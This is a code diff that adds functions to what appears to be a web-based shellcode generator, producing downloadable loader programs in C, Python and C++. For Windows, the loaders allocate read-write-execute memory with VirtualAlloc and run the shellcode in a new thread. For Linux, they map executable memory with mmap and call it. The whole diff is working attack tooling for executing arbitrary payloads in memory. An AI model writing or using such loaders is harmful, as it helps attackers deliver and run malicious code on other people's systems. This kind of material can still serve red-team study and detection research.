@@ -304,6 +304,210 @@
             a.click();
         }
 
+        function downloadStub(type) {
+            const platform = document.getElementById('platform').value;
+            const output = document.getElementById('shellcodeOutput').textContent;
+            
+            let stub = '';
+            let filename = '';
+            
+            if (type === 'c') {
+                filename = 'shellcode_loader.c';
+                stub = generateCStub(output, platform);
+            } else if (type === 'python') {
+                filename = 'shellcode_loader.py';
+                stub = generatePythonStub(output, platform);
+            } else if (type === 'exe') {
+                filename = 'shellcode_loader.cpp';
+                stub = generateExeStub(output, platform);
+            }
+            
+            const blob = new Blob([stub], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = filename;
+            a.click();
+        }
+        
+        function generateCStub(shellcode, platform) {
+            if (platform === 'windows') {
+                return `#include <windows.h>
+#include <stdio.h>
+
+unsigned char shellcode[] = "${shellcode}";
+
+int main() {
+    LPVOID lpAlloc = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (lpAlloc == NULL) {
+        printf("Memory allocation failed\\n");
+        return -1;
+    }
+    
+    memcpy(lpAlloc, shellcode, sizeof(shellcode));
+    
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAlloc, NULL, 0, NULL);
+    if (hThread != NULL) {
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+    }
+    
+    return 0;
+}`;
+            } else {
+                return `#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+unsigned char shellcode[] = "${shellcode}";
+
+int main() {
+    void *mem = mmap(0, sizeof(shellcode), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    if (mem == MAP_FAILED) {
+        perror("mmap");
+        return -1;
+    }
+    
+    memcpy(mem, shellcode, sizeof(shellcode));
+    
+    int (*sc)() = (int(*)())mem;
+    sc();
+    
+    return 0;
+}`;
+            }
+        }
+        
+        function generatePythonStub(shellcode, platform) {
+            if (platform === 'windows') {
+                return `import ctypes
+import platform
+
+# Shellcode
+shellcode = ${shellcode}
+
+# Allocate memory with RWX permissions
+ptr = ctypes.windll.kernel32.VirtualAlloc(
+    ctypes.c_int(0), 
+    ctypes.c_int(len(shellcode)), 
+    ctypes.c_int(0x3000), 
+    ctypes.c_int(0x40)
+)
+
+# Copy shellcode to allocated memory
+buffer = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
+ctypes.windll.kernel32.RtlMoveMemory(
+    ctypes.c_int(ptr), 
+    buffer, 
+    ctypes.c_int(len(shellcode))
+)
+
+# Create a function pointer to our shellcode
+ht = ctypes.windll.kernel32.CreateThread(
+    ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.c_int(ptr),
+    ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.pointer(ctypes.c_int(0))
+)
+
+# Wait for thread to complete
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+`;
+            } else {
+                return `import ctypes
+import mmap
+import platform
+
+# Shellcode
+shellcode = ${shellcode}
+
+# Make memory executable
+memory = mmap.mmap(
+    -1, 
+    len(shellcode),
+    flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
+    prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC
+)
+
+# Write shellcode to memory
+memory.write(shellcode)
+
+# Cast memory to callable function and execute
+function = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_void_p.from_buffer(memory)))
+function()
+`;
+            }
+        }
+        
+        function generateExeStub(shellcode, platform) {
+            if (platform === 'windows') {
+                return `#include <windows.h>
+#include <iostream>
+
+// Shellcode
+unsigned char shellcode[] = "${shellcode}";
+
+int main() {
+    // Allocate memory for shellcode
+    LPVOID lpAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!lpAlloc) {
+        std::cerr << "Memory allocation failed: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    // Copy shellcode to allocated memory
+    memcpy(lpAlloc, shellcode, sizeof(shellcode));
+
+    // Execute shellcode
+    DWORD threadId;
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAlloc, NULL, 0, &threadId);
+    if (!hThread) {
+        std::cerr << "Thread creation failed: " << GetLastError() << std::endl;
+        VirtualFree(lpAlloc, 0, MEM_RELEASE);
+        return 1;
+    }
+
+    // Wait for shellcode execution to complete
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+    VirtualFree(lpAlloc, 0, MEM_RELEASE);
+
+    return 0;
+}`;
+            } else {
+                return `#include <iostream>
+#include <sys/mman.h>
+#include <cstring>
+#include <unistd.h>
+
+// Shellcode
+unsigned char shellcode[] = "${shellcode}";
+
+int main() {
+    // Allocate memory with read/write/execute permissions
+    void* mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (mem == MAP_FAILED) {
+        std::cerr << "Memory allocation failed: " << strerror(errno) << std::endl;
+        return 1;
+    }
+
+    // Copy shellcode to allocated memory
+    memcpy(mem, shellcode, sizeof(shellcode));
+
+    // Execute shellcode
+    int (*sc)() = (int(*)())mem;
+    sc();
+
+    // Clean up (though we may never reach this point)
+    munmap(mem, sizeof(shellcode));
+    return 0;
+}`;
+            }
+        }
+
         function toggleTheme() {
             const current = localStorage.getItem('theme') || 'light';
             const next = current === 'dark' ? 'light' : 'dark';
